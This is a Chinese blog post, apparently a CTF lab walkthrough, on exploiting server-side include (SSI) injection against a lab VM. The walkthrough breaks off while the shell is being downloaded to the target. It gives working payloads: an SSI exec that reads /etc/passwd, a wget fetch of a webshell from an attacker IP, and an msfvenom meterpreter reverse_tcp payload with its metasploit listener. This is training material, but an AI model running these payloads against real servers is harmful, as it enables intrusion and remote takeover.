<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="m0re"><meta name="copyright" content="m0re"><meta name="generator" content="Hexo 5.1.0"><meta name="theme" content="hexo-theme-yun"><title>CTF————Web安全SSI注入 | m0re的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" href="/m0re.ico"><link rel="mask-icon" href="/m0re.ico" color="#6200ee"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"m0re.top","root":"/","title":"人生路漫漫","version":"1.6.1","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="本文首发FreeBuf.COM原本地址——🍗CTF——Web安全SSI注入 前言：如何从外部进入主机 SSI注入攻击介绍简单理解SSI(server side inject)的出现是为了赋予HTML静态页面动态的效果，通过SSI来执行系统命令；并返回对应的结果。 如果再网站目录中发现了.stm；.shtm；.shtml；这样的文件后缀名，并且网站对于SSI的输入没有做到严格过滤或者过滤不充分；很">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF————Web安全SSI注入">
<meta property="og:url" content="https://m0re.top/posts/b4cfe3c7/index.html">
<meta property="og:site_name" content="m0re的小站">
<meta property="og:description" content="本文首发FreeBuf.COM原本地址——🍗CTF——Web安全SSI注入 前言：如何从外部进入主机 SSI注入攻击介绍简单理解SSI(server side inject)的出现是为了赋予HTML静态页面动态的效果，通过SSI来执行系统命令；并返回对应的结果。 如果再网站目录中发现了.stm；.shtm；.shtml；这样的文件后缀名，并且网站对于SSI的输入没有做到严格过滤或者过滤不充分；很">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020080117460350.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020080117462391.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801174704296.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801174719735.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801174735787.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801174758402.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801175131376.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801174817312.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801174906852.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801175109305.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801175317199.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801175328391.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801175408808.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020080117543731.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801175504902.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801175517993.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020080117553599.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801175551640.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801175815913.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200801175832732.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70">
<meta property="article:published_time" content="2020-08-23T08:31:57.566Z">
<meta property="article:modified_time" content="2020-09-01T07:51:18.676Z">
<meta property="article:author" content="m0re">
<meta property="article:tag" content="CTF靶场系列">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/2020080117460350.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="m0re"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="m0re"><span class="site-author-status" title="穷鬼啊啊啊啊">😭</span></a><div class="site-author-name"><a href="/about/">m0re</a></div><span class="site-name">m0re的小站</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">99</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">11</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">41</span></a></div><a class="site-state-item hty-icon-button" href="/Tools/" title="Tools"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/zxcv0221" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/ISm0r3" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:m0re.lxj@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSI%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">SSI注入攻击介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">简单理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSI%E8%AF%AD%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">SSI语法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">实验环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.1.</span> <span class="toc-text">信息探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E6%8C%96%E6%8E%98"><span class="toc-number">2.2.</span> <span class="toc-text">深入挖掘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B6%E4%BD%9Cwebshell"><span class="toc-number">2.4.</span> <span class="toc-text">制作webshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://m0re.top/posts/b4cfe3c7/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="m0re"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="m0re的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">CTF————Web安全SSI注入</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2020-08-23 16:31:57" itemprop="dateCreated datePublished" datetime="2020-08-23T16:31:57+08:00">2020-08-23</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <span class="post-meta-icon-text">更新于</span> <time title="修改时间：2020-09-01 15:51:18" itemprop="dateModified" datetime="2020-09-01T15:51:18+08:00">2020-09-01</time></div><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="leancloud_visitors" id="/posts/b4cfe3c7/" data-flag-title="CTF————Web安全SSI注入"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-tag"><a class="tag-item" href="/tags/CTF%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">CTF靶场系列</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#6200ee;"><p>本文首发<a target="_blank" rel="noopener" href="https://www.freebuf.com/">FreeBuf.COM</a><br>原本地址——🍗<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/245231.html">CTF——Web安全SSI注入</a></p>
<p>前言：如何从外部进入主机</p>
<h1 id="SSI注入攻击介绍"><a href="#SSI注入攻击介绍" class="headerlink" title="SSI注入攻击介绍"></a>SSI注入攻击介绍</h1><h2 id="简单理解"><a href="#简单理解" class="headerlink" title="简单理解"></a>简单理解</h2><p>SSI(server side inject)的出现是为了赋予HTML静态页面动态的效果，通过SSI来执行系统命令；并返回对应的结果。</p>
<p>如果再网站目录中发现了<code>.stm；.shtm；.shtml；</code>这样的文件后缀名，并且网站对于SSI的输入没有做到严格过滤或者过滤不充分；很有可能被SSI注入攻击。</p>
<h2 id="SSI语法"><a href="#SSI语法" class="headerlink" title="SSI语法"></a>SSI语法</h2><p>①显示服务器端环境变量<code>&lt;#echo&gt;</code></p>
<p>本文档名称：</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!–#echo</span> <span class="token attr-name">var</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DOCUMENT_NAME<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span></code></pre>

<p>现在时间：</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!–#echo</span> <span class="token attr-name">var</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DATE_LOCAL<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span></code></pre>

<p>显示IP地址：</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!</span> <span class="token attr-name">#echo</span> <span class="token attr-name">var</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>REMOTE_ADDR<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span></code></pre>

<p>②将文本内容直接插入到文档中<code>&lt;#include&gt;</code></p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!</span> <span class="token attr-name">#include</span> <span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>文件名称<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span>

<span class="token comment">&lt;!--#include virtual="index.html" --></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!</span> <span class="token attr-name">#include</span> <span class="token attr-name">virtual</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>文件名称<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span>

<span class="token comment">&lt;!--#include virtual="/www/footer.html" --></span></code></pre>

<p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</p>
<p>③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</p>
<p>文件最近更新日期：</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!</span> <span class="token attr-name">#flastmod</span> <span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>文件名称<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span></code></pre>

<p>文件的长度：</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!–#fsize</span> <span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>文件名称<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span></code></pre>

<p>④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!–#exec</span> <span class="token attr-name">cmd</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>文件名称<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span>

<span class="token comment">&lt;!--#exec cmd="cat /etc/passwd"--></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!–#exec</span> <span class="token attr-name">cgi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>文件名称<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!--#exec</span> <span class="token attr-name">cgi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/cgi-bin/access_log.cgi<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span></code></pre>

<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>攻击机：kali <code>10.0.2.4</code></p>
<p>靶场机器：linux<code>10.0.2.15</code></p>
<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>扫描主机服务信息以及服务版本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">nmap -sV <span class="token punctuation">[</span>ip<span class="token punctuation">]</span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020080117460350.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>可以看出靶场机器开放了80端口并且操作系统是ubuntu</p>
<p>快速扫描主机全部信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">nmap -T4 -A -v <span class="token punctuation">[</span>ip<span class="token punctuation">]</span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020080117462391.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>既然是开启的http服务，那么就应该是可以访问的，思路就是可以在浏览器直接访问查看有没有可以利用的信息，并且扫描结果显示robots协议中发现一个信息。有时候还会在源代码中藏有信息。<br><img src="https://img-blog.csdnimg.cn/20200801174704296.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>这个在默认界面没有发现信息，但是robots中发现了目录<code> /spukcab</code><br><img src="https://img-blog.csdnimg.cn/20200801174719735.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>挨个查看，看看有无敏感信息。可以下载下来，more查看内容，发现一个可能有用的信息，根据前几次的经验，这里可能是个用户名<code>webmaster</code>；只是可能。还有就是站点根目录的位置已经得到了。<br><img src="https://img-blog.csdnimg.cn/20200801174735787.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>其他的暂时没有，继续探测，因为是http服务，所以可以使用nikto或者dirb进行敏感目录扫描</p>
<h2 id="深入挖掘"><a href="#深入挖掘" class="headerlink" title="深入挖掘"></a>深入挖掘</h2><p>分析nmap、nikto扫描结果，并对结果进行分析，挖掘可利用的信息；<br><img src="https://img-blog.csdnimg.cn/20200801174758402.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>都进行浏览查看敏感信息，寻找可利用的位置；</p>
<p>挨个访问查看信息，<code>http://10.0.2.15/index</code><br><img src="https://img-blog.csdnimg.cn/20200801175131376.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>上面扫描中有个SSI<br><img src="https://img-blog.csdnimg.cn/20200801174817312.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>还有这里，发现<code>.shtml</code>文件<br><img src="https://img-blog.csdnimg.cn/20200801174906852.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>猜想可能存在SSI注入，其实找了很多信息，就是为了找到这个能证明有SSI存在的标志。</p>
<p>继续找可以利用的信息，发现<code>http://10.0.2.15/index.php</code><br><img src="https://img-blog.csdnimg.cn/20200801175109305.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以在这个表单提交处，这里执行SSI的命令</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>根据提示来利用对应的SSI注入</p>
<p>将上面index页面中的payload复制一下，粘贴到表单中进行提交</p>
<p>像这样<br><img src="https://img-blog.csdnimg.cn/20200801175317199.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>提交后发现第一行过滤了尖括号，第二行的exec被过滤了。而且payload也不是完整的。<br><img src="https://img-blog.csdnimg.cn/20200801175328391.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>绕过这个exec的过滤条件，因为是linux系统，所以首先想到的应该是大小写。而且完整的payload应当在前面有<code>!</code><br>像这样</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--#exec cmd="cat /etc/passwd" --></span> </code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200801175408808.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>比如：</p>
<p>列举当前目录中的文件和目录</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--#exec cmd="ls"--></span></code></pre>

<p>就是可以执行一些终端命令</p>
<p>进一步利用，下载一个shell脚本并重命名为shell.php</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--#exec cmd="wget http://ip/shell.txt | rename shell.txt shell.php"--></span></code></pre>

<h2 id="制作webshell"><a href="#制作webshell" class="headerlink" title="制作webshell"></a>制作webshell</h2><p>之前使用的php制作的webshell，这次使用python</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msfvenom -p python/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">10.0</span>.2.4 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> -f raw <span class="token operator">></span> /root/Desktop/shell.py</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020080117543731.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>启动监听，使用metasploit对4444端口进行监听</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/multi/handler 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcp
msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload python/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">></span> python/meterpreter/reverse_tcp

msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lhost <span class="token number">10.0</span>.2.4
lhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.0</span>.2.4
msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.0</span>.2.4:4444 </code></pre>

<p>设置好后开始侦听4444端口<br><img src="https://img-blog.csdnimg.cn/20200801175504902.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>将shell.py移动到apache目录下，才可以使用IP地址的链接下载<br><img src="https://img-blog.csdnimg.cn/20200801175517993.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>然后需要开启apache服务<code>service apache2 start</code><br><img src="https://img-blog.csdnimg.cn/2020080117553599.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>然后执行下载命令将shell下载到靶机的站点目录当中，</p>
